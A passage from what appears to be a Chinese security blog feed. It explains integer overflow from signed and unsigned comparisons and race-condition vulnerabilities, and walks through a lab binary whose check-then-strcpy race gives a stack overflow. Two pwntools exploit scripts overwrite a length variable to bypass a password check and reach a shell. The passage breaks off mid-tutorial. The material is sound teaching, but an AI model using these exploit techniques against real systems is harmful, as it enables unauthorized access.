333Q362 478 354 524T321 597Z" transform="translate(6500,0)"></path><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z" transform="translate(7000,0)"></path><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z" transform="translate(7500,0)"></path><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z" transform="translate(8000,0)"></path></g><g data-mml-node="msub" transform="translate(14290.7,0)"><g data-mml-node="mo"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mn" transform="translate(422,-150) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g></g></g></g></svg></mjx-container>，前16位为$$(0000000000000001)<em>2=1</em>{10}$$；</li>
</ul>
<img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210209201254.png" style="zoom:25%;">

<h2 id="符号问题"><a href="#符号问题" class="headerlink" title="符号问题"></a>符号问题</h2><p>符号问题引发的整数溢出漏洞，大致有三点需要注意：</p>
<ol>
<li>有符号整数之间的比较<ul>
<li>  从汇编中可以看到，当两个有符号整数比较大小时，是将两数作差，若结果为正则显示被减数大，若结果为负则显示减数大；</li>
<li>  当两个有符号整数作差时出现上溢或下溢时，比较结果会与事实相反；</li>
<li>  例如，short类型的32767与-5比较大小时，在计算机中，short类型的<mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="27.655ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 12223.6 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mn"><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z"></path><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z" transform="translate(500,0)"></path><path data-c="37" d="M55 458Q56 460 72 567L88 674Q88 676 108 676H128V672Q128 662 143 655T195 646T364 644H485V605L417 512Q408 500 387 472T360 435T339 403T319 367T305 330T292 284T284 230T278 162T275 80Q275 66 275 52T274 28V19Q270 2 255 -10T221 -22Q210 -22 200 -19T179 0T168 40Q168 198 265 368Q285 400 349 489L395 552H302Q128 552 119 546Q113 543 108 522T98 479L95 458V455H55V458Z" transform="translate(1000,0)"></path><path data-c="36" d="M42 313Q42 476 123 571T303 666Q372 666 402 630T432 550Q432 525 418 510T379 495Q356 495 341 509T326 548Q326 592 373 601Q351 623 311 626Q240 626 194 566Q147 500 147 364L148 360Q153 366 156 373Q197 433 263 433H267Q313 433 348 414Q372 400 396 374T435 317Q456 268 456 210V192Q456 169 451 149Q440 90 387 34T253 -22Q225 -22 199 -14T143 16T92 75T56 172T42 313ZM257 397Q227 397 205 380T171 335T154 278T148 216Q148 133 160 97T198 39Q222 21 251 21Q302 21 329 59Q342 77 347 104T352 209Q352 289 347 316T329 361Q302 397 257 397Z" transform="translate(1500,0)"></path><path data-c="37" d="M55 458Q56 460 72 567L88 674Q88 676 108 676H128V672Q128 662 143 655T195 646T364 644H485V605L417 512Q408 500 387 472T360 435T339 403T319 367T305 330T292 284T284 230T278 162T275 80Q275 66 275 52T274 28V19Q270 2 255 -10T221 -22Q210 -22 200 -19T179 0T168 40Q168 198 265 368Q285 400 349 489L395 552H302Q128 552 119 546Q113 543 108 522T98 479L95 458V455H55V458Z" transform="translate(2000,0)"></path></g><g data-mml-node="mo" transform="translate(2722.2,0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="mo" transform="translate(3722.4,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mo" transform="translate(4111.4,0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="mn" transform="translate(4889.4,0)"><path data-c="35" d="M164 157Q164 133 148 117T109 101H102Q148 22 224 22Q294 22 326 82Q345 115 345 210Q345 313 318 349Q292 382 260 382H254Q176 382 136 314Q132 307 129 306T114 304Q97 304 95 310Q93 314 93 485V614Q93 664 98 664Q100 666 102 666Q103 666 123 658T178 642T253 634Q324 634 389 662Q397 666 402 666Q410 666 410 648V635Q328 538 205 538Q174 538 149 544L139 546V374Q158 388 169 396T205 412T256 420Q337 420 393 355T449 201Q449 109 385 44T229 -22Q148 -22 99 32T50 154Q50 178 61 192T84 210T107 214Q132 214 148 197T164 157Z"></path></g><g data-mml-node="mo" transform="translate(5389.4,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(6056.2,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mo" transform="translate(7112,0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="mn" transform="translate(7890,0)"><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z"></path><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z" transform="translate(500,0)"></path><path data-c="37" d="M55 458Q56 460 72 567L88 674Q88 676 108 676H128V672Q128 662 143 655T195 646T364 644H485V605L417 512Q408 500 387 472T360 435T339 403T319 367T305 330T292 284T284 230T278 162T275 80Q275 66 275 52T274 28V19Q270 2 255 -10T221 -22Q210 -22 200 -19T179 0T168 40Q168 198 265 368Q285 400 349 489L395 552H302Q128 552 119 546Q113 543 108 522T98 479L95 458V455H55V458Z" transform="translate(1000,0)"></path><path data-c="36" d="M42 313Q42 476 123 571T303 666Q372 666 402 630T432 550Q432 525 418 510T379 495Q356 495 341 509T326 548Q326 592 373 601Q351 623 311 626Q240 626 194 566Q147 500 147 364L148 360Q153 366 156 373Q197 433 263 433H267Q313 433 348 414Q372 400 396 374T435 317Q456 268 456 210V192Q456 169 451 149Q440 90 387 34T253 -22Q225 -22 199 -14T143 16T92 75T56 172T42 313ZM257 397Q227 397 205 380T171 335T154 278T148 216Q148 133 160 97T198 39Q222 21 251 21Q302 21 329 59Q342 77 347 104T352 209Q352 289 347 316T329 361Q302 397 257 397Z" transform="translate(1500,0)"></path><path data-c="34" d="M462 0Q444 3 333 3Q217 3 199 0H190V46H221Q241 46 248 46T265 48T279 53T286 61Q287 63 287 115V165H28V211L179 442Q332 674 334 675Q336 677 355 677H373L379 671V211H471V165H379V114Q379 73 379 66T385 54Q393 47 442 46H471V0H462ZM293 211V545L74 212L183 211H293Z" transform="translate(2000,0)"></path></g><g data-mml-node="mo" transform="translate(10667.8,0)"><path data-c="3C" d="M694 -11T694 -19T688 -33T678 -40Q671 -40 524 29T234 166L90 235Q83 240 83 250Q83 261 91 266Q664 540 678 540Q681 540 687 534T694 519T687 505Q686 504 417 376L151 250L417 124Q686 -4 687 -5Q694 -11 694 -19Z"></path></g><g data-mml-node="mn" transform="translate(11723.6,0)"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"></path></g></g></g></svg></mjx-container>，从而得出32767&lt;-5的错误结论；</li>
</ul>
</li>
<li>有符号整数的运算<ul>
<li>  当两个有符号整数运算时，有可能发生上溢或者下溢；</li>
</ul>
</li>
<li>无符号整数和有符号整数的比较(运算)<ul>
<li>  当无符号整数和有符号整数进行比较或运算时，会将有符号整数转化成无符号整数之后进行比较或运算，从而导致上溢下溢以及与事实相反的结论；</li>
<li>  例如，short类型的-5与unsigned short类型的13比较大小时，-5转化成无符号整数后等于65531&gt;13，与事实相反；</li>
</ul>
</li>
</ol>
<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>以如下程序为例进行漏洞分析；</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* integer_overflow */</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> N 95</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>{</span><br><span class="line">    <span class="type">int</span> Number;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span> number;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>){</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"ID Number:"</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;Number);</span><br><span class="line">        number = Number;</span><br><span class="line">        <span class="keyword">if</span>(number &lt;= N &amp;&amp; Number &gt; N){</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">"Welcome!!!"</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">else</span> {</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"%d\n"</span>, number);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"It is illegal, please check your id number.\n"</span>);</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></table></figure>

<ul>
<li><p>  number和Number的数据类型不同，可以表示的数据范围不同，因此，可以通过整数溢出 的方式实现输出<code>Welcome!!!</code>；</p>
</li>
<li><p>输入一个合适的较大的值给Number，使得在Number给number赋值时发生截断之后， number的值较小，从而满足if条件；</p>
  <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210210093107.png" style="zoom:50%;">

  <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210210093252.png" style="zoom:50%;"></li>
<li><p>  通常情况下，整数溢出只是用来改变程序流程，需要结合其他漏洞类型进一步实现漏洞利用；</p>
</li>
</ul>
<p>备注：<a href="https://github.com/Leeyuxun/Binary-Experiment-Program">实验程序下载</a></p>
]]></content>
      <categories>
        <category>二进制学习</category>
      </categories>
      <tags>
        <tag>整数溢出</tag>
      </tags>
  </entry>
  <entry>
    <title>二进制-条件竞争漏洞</title>
    <url>/%E4%BA%8C%E8%BF%9B%E5%88%B6-%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%E6%BC%8F%E6%B4%9E.html</url>
    <content><![CDATA[<h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><h2 id="条件竞争"><a href="#条件竞争" class="headerlink" title="条件竞争"></a>条件竞争</h2><p>系统中，最小的运算调度单位是线程，而每个线程又依附于一个进程，条件竞争则是<strong>多进程或多线程对一个共享资源操作，因为操作顺序不受控的时候所产生的问题</strong>；</p>
<span id="more"></span>

<h2 id="进程"><a href="#进程" class="headerlink" title="进程"></a>进程</h2><ul>
<li>  进程是为了更好的利用CPU资源；</li>
<li>  进程是系统进行资源分配和调度的一个独立单位；</li>
<li>  每个进程都有自己的独立内存空间，不同进程通过进程间通信来通信；</li>
<li>  由于进程比较重要，占据独立的内存，所以上下文进程间的切换开销(栈、寄存器、虚拟内存、文件句柄等)比较大，但相对比较稳定安全；</li>
</ul>
<h2 id="线程"><a href="#线程" class="headerlink" title="线程"></a>线程</h2><ul>
<li>  线程的是为了降低上下文切换的消耗，提高系统的并发性，并突破一个进程只能干一样事的缺陷，使到进程内并发成为可能；</li>
<li>  线程是进程的一个实体，是CPU调度和分派的基本单位，它是比进程更小的能独立运行的基本单位；</li>
<li>  线程自己基本上不拥有系统资源，只拥有在运行中必不可少的资源(如程序计数器、一组寄存器和栈)，但是它可与同属一个进程的其他的线程共享进程所拥有的全部资源；</li>
<li>  线程间通信主要通过共享内存，上下文切换很快，资源开销较少，但相比进程不够稳定容易丢失数据；</li>
</ul>
<h2 id="协程"><a href="#协程" class="headerlink" title="协程"></a>协程</h2><ul>
<li>  协程通过在线程中实现调度，避免了陷入内核级别的上下文切换造成的性能损失，进而突破了线程在IO上的性能瓶颈；</li>
<li>  协程拥有自己的寄存器上下文和栈；</li>
<li>  协程调度切换时，将寄存器上下文和栈保存到其他地方，在切回来的时候，恢复先前保存的寄存器上下文和栈，直接操作栈则基本没有内核切换的开销；</li>
</ul>
<h2 id="并发编程"><a href="#并发编程" class="headerlink" title="并发编程"></a>并发编程</h2><ul>
<li><p>  目的：并发编程在实际情况是为了提高执行效率，提高系统的利用率；</p>
</li>
<li><p>  CPU的速度远快于各种IO，而这也导致了CPU在很多时候，都是在持续等待中；</p>
</li>
<li><p>  然而如果利用分时的机制，这样可以让CPU将不同时间片分发给不同的task，这样就能大大的提示CPU的利用率；</p>
</li>
<li><p>而且这种机制也可以让多个程序分开执行不同任务；</p>
  <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210225160645.png" style="zoom:40%;"></li>
<li><p>  从整个程序的执行角度来看，程序执行时可以看作是对输入的数据进行计算处理然后输出到特定的设备中；</p>
</li>
<li><p>  当其中的一个环节正在执行的时候其他环节就会挂起；</p>
</li>
<li><p>  一旦输入阻塞，即IO等待读入数据，那么已读入的数据也不能得到处理，已处理的数据也不能输出，这就造成了CPU的闲置；</p>
</li>
<li><p>  如果这三个步骤可以并发执行的话，即使IO在等待输入，CPU仍然可以对已在内存中的数据做计算处理，结果也可以正常输出；</p>
</li>
<li><p>  这就提高了CPU的利用率，不会因为输入输出的阻塞，导致CPU的计算能力被浪费；</p>
</li>
<li><p>  当有多种类型的任务执行时，为每种任务单独编写程序，比编写混杂在一起的所有任务的程序，要简单的多；</p>
</li>
</ul>
<h1 id="条件竞争漏洞"><a href="#条件竞争漏洞" class="headerlink" title="条件竞争漏洞"></a>条件竞争漏洞</h1><h2 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><ul>
<li>  当一个系统运行结果，依赖于不可控的事情的先后顺序的时候，就可能发生竞争；</li>
<li>  往往程序员可能无法注意到这些事情，因为在编写程序的时候，往往认为程序一条线执行下来，但是一个线程在运行中是可能被随时打断，并且挂起，然后去执行其他线程的逻辑。导致出现了设计人员意料之外的情况，最终出现bug；</li>
</ul>
<h2 id="条件竞争产生的条件"><a href="#条件竞争产生的条件" class="headerlink" title="条件竞争产生的条件"></a>条件竞争产生的条件</h2><ul>
<li><strong>并发</strong>，即至少存在两个并发执行流<ul>
<li>  这里的执行流包括线程、进程、任务等级别的执行流；</li>
</ul>
</li>
<li><strong>共享对象</strong>，即多个并发流会访问同一对象<ul>
<li>  常见的共享对象有共享内存、文件系统、信号，这些共享对象是用来使得多个程序执行流相互交流；</li>
</ul>
</li>
<li><strong>改变对象</strong>，即至少有一个控制流会改变竞争对象的状态<ul>
<li>  如果程序只是对对象进行读操作，那么并不会产生条件竞争；</li>
</ul>
</li>
</ul>
<p>举例分析，如下图：</p>
<ul>
<li><p>  task1先对共享的空间进行了一个安全性检查，检查完之后，task2紧接着修改了共享空间的内容，导致task1的安全性检查边的不可控，甚至可以是一个不安全的数据，然而再次在获取数据的时候，就可能出现预期之外的情况，严重的可能导致程序执行流被劫持；</p>
</li>
<li><p>但是在程序员的角度，从check到get这个过程中共享空间的内容是不会变的，但是对于多线程来说，这个是未知的；</p>
  <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210225162303.png" style="zoom:50%;"></li>
</ul>
<h2 id="条件竞争漏洞示例1分析"><a href="#条件竞争漏洞示例1分析" class="headerlink" title="条件竞争漏洞示例1分析"></a>条件竞争漏洞示例1分析</h2><ul>
<li><p>将程序放入IDA中反汇编，得到main函数如下，调用了init_main()函数和login函数；</p>
  <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210225164435.png" style="zoom:40%;"></li>
<li><p>init_main()函数，发现其利用urandom中的真随机数生成器生成数据，函数利用urandom中的数据为种子，生成一串长为0xf也就是15字节，无法预测password中的密码；</p>
  <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210225164959.png" style="zoom:40%;"></li>
<li><p>login函数</p>
<ul>
<li><p>  逻辑上可以看出，<code>read(0, share_buf, 0x100)</code>是先让用户输入了一个password，长度不超过<code>0x100</code>，然后将这个数据保存到<code>&amp;share_buf</code>中，<code>&amp;share_buf</code>是局部变量，保存在栈上的<code>bss</code>段上；</p>
</li>
<li><p>再通过<code>pthread_create</code>创建一个<code>check_password</code>的函数去检测<code>&amp;share_buf</code>中保存的password是否为一个合法的值；</p>
  <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210225165416.png" style="zoom:50%;"></li>
</ul>
</li>
<li><p>check_password函数</p>
<ul>
<li>  a1即share_buf，输入的口令；</li>
<li>  先根据输入的password长度,在栈上开辟一段空间(alloca函数是在栈上开辟空间)，开辟的空间大小为<code>0x10*((n+0xF)/0x10)</code>；</li>
<li>  然后再判断输入的长度是否和password的长度一样长，如果不一样则会直接结束；</li>
<li>  如果一样长则会获取要比较的字符串长度，然后会调用strcpy函数，将用户密码从bss段上复制一份到栈上，然后调用strncmp函数来比较用户输入的密码是否与随机生成密码一样，如果一样的话，则起一个shell，如果不一样，就会登陆失败，直接返回；</li>
</ul>
  <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210225165645.png" style="zoom:50%;"></li>
<li><p>分析</p>
<ul>
<li><p>  bss上的share_buf是作为参数传递给check_password；</p>
</li>
<li><p>  即主线程和子线程共同操作同一块内存空间；</p>
</li>
<li><p>如果在子线程调用alloc之后，调用strcpy之前，通过主线程去修改位于bss段上的share_buf，就可以在strcpy处产生溢出；</p>
  <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210225170238.png" style="zoom:50%;"></li>
<li><p>  然后在程序中，子进程的strcpy之前有一个<code>sleep(1)</code>操作；</p>
</li>
<li><p>导致了alloc到strcpy之间有足够的时间，让主线程去修改共享变量；</p>
<ul>
<li>  例如，将共享变量share_buf里面的数据长度改的超过一开始alloc的长度，这样就会造成栈溢出；</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="条件竞争漏洞利用"><a href="#条件竞争漏洞利用" class="headerlink" title="条件竞争漏洞利用"></a>条件竞争漏洞利用</h2><ol>
<li><p>利用思路</p>
<ul>
<li>  checksec发现程序开启了canary，所以直接溢出覆盖返回值是不行的，无法劫持程序流；</li>
<li>登陆成功，程序会自动起一个shell，如果想要登陆成功：<ol>
<li> 需要控制strncmp返回值为0；</li>
<li> 或者是控制dest的地址指向password；</li>
<li> 或者控制n为0；</li>
</ol>
</li>
<li>  控制dest是不行的，因为dest指向的是stack上，stack的地址一般是<code>0x7f0000000000</code>开头的，而password的地址为<code>0x06020E0</code>又是通过strcpy复制过去的，不能有过多的<code>\x00</code>，所以这里覆盖dest是不可行的；</li>
<li>  可以利用strcpy会在结尾加<code>\x00</code>的特性去覆盖n，使得n的值为0，这样成功的时候strncmp也可以返回0，以达到绕过登陆的目的；</li>
</ul>
</li>
<li><p>编写payload如下，功能为先启动程序，接着用gdb.attach调试，并且在0x0400CB2处下一个断点，也就是strcpy处下断点，然后先后发两次数据过去，一次长度为<code>0xf</code>个<code>a</code>，一次为<code>0x60</code>个<code>a</code>；</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">'amd64'</span>, os = <span class="string">'linux'</span>, endian = <span class="string">'little'</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">GameStart</span>(<span class="params">ip, port, debug</span>):</span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        p = process(<span class="string">'./Racecondition'</span>)</span><br><span class="line">        gdb.attach(p, <span class="string">'b *0x0400CB2'</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p = retmoe(ip, port)</span><br><span class="line">    p.recvuntil(<span class="string">':\n'</span>)</span><br><span class="line">    p.send(<span class="string">'a'</span> * <span class="number">0xf</span> + <span class="string">'\x00'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">':\n'</span>)</span><br><span class="line">    p.send(<span class="string">'a'</span> * <span class="number">0x60</span> + <span class="string">'\x00'</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    GameStart(<span class="string">''</span>, <span class="number">2333</span>, <span class="number">1</span>)</span><br></pre></td></tr></table></figure>

 <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210225173140.png" style="zoom:33%;"></li>
<li><p>执行分析</p>
<ul>
<li><p>  程序执行过程中，第一次输入<code>0xf</code>个a之后，应该起了第一个线程，并且第一个线程进入到了sleep函数中；</p>
</li>
<li><p>  check-password线程先睡眠，但是主进程pthread_create()不会因为check- password线程睡眠而终止，它继续执行后面的return，返回主函数后，接着循环，再执行输入login()函数；</p>
</li>
<li><p>  第二次输入0x60个a之后写入share_buf，程序起了第二个check-password线程；</p>
</li>
<li><p>  二个线程发现share_buf(即s)长度超了，所以输出了一个”The password length error!”，但是这时候第一个线程在strcpy前还在等待中，然而即将要被复制的share_buf内容却被第二个线程输入了<code>0x60</code>个a，这时候gdb分析栈的信息；</p>
</li>
<li><p>gdb已经停在了strcpy函数处；</p>
  <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210225175005.png" style="zoom:25%;"></li>
<li><p>查看src即share_buf中的内容如下，写入<code>0x60</code>个a；</p>
  <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210225175315.png" style="zoom:40%;"></li>
<li><p>查看栈信息如下；</p>
  <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210225175617.png" style="zoom:33%;"></li>
<li><p>ni执行strcpy后，偏移地址0000-0060，写入了<code>0x60</code>个a；</p>
<p>  <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210225180022.png"></p>
</li>
</ul>
</li>
<li><p>重新编写payload，覆盖n，将n置为0，绕过strncmp，获取shell；</p>
<ul>
<li><p>从内容上来看，这时候share_buf里面已经存放了<code>0x60</code>个a了，从ida中可以看出， alloca之前的rsp栈顶的位置位于<code>rbp–0x70</code>处(即v4，v4的地址是<code>rsp+0h</code>,即rsp的值，即<code>rbp–0x70</code>；</p>
  <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210225203832.png" style="zoom:50%;"></li>
<li><p>  通过对<code>alloca(16*((n+15)/0x10))</code>的计算，这里应该是<code>16*((0xf+15)/0x10)=0x10</code>(这里n应该是第一个线程的0xf，第一个线程已经把strcpy之前的代码走完了)，相当于alloca重新在栈上分配了<code>0x10</code>空间，rsp向低地址空间增长了<code>0x10</code>；</p>
</li>
<li><p>  执行strcpy后，偏移地址<code>0000-0060</code>，写入了<code>0x60</code>个a,发生了栈溢出，继续执行下去会发生段错误，是因为覆盖到了dest地址，使得dest的值变为了<code>0x6161616161616161</code>导致这是一个无效的地址 ，程序在访问的时候，会出现异常;</p>
</li>
<li><p>接下来考虑如何覆盖n；</p>
<ul>
<li><p>  strcpy是从栈顶开始复制的，而n的位置位于<code>rsp+20</code>，然后前面alloca申请的大小为<code>0x10</code>；</p>
</li>
<li><p>所以n应该位于<code>0x30</code>的位置，所幸这里dest的位置比n低，所以在覆盖的时候，只会覆盖n，不会覆盖破坏dest的内容，就可以达到绕过strncmp的目的；</p>
  <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210225205436.png" style="zoom:50%;"></li>
</ul>
</li>
<li><p>修改payload如下</p>
  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">'amd64'</span>, os = <span class="string">'linux'</span>, endian = <span class="string">'little'</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">GameStart</span>(<span class="params">ip, port, debug</span>):</span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        p = process(<span class="string">'./Racecondition'</span>)</span><br><span class="line">        gdb.attach(p, <span class="string">'b *0x0400CB2'</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p = retmoe(ip, port)</span><br><span class="line">    p.recvuntil(<span class="string">':\n'</span>)</span><br><span class="line">    p.send(<span class="string">'a'</span> * <span class="number">0xf</span> + <span class="string">'\x00'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">':\n'</span>)</span><br><span class="line">    p.send(<span class="string">'a'</span> * <span class="number">0x30</span> + <span class="string">'\x00'</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    GameStart(<span class="string">''</span>, <span class="number">2333</span>, <span class="number">1</span>)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>再次执行脚本</p>
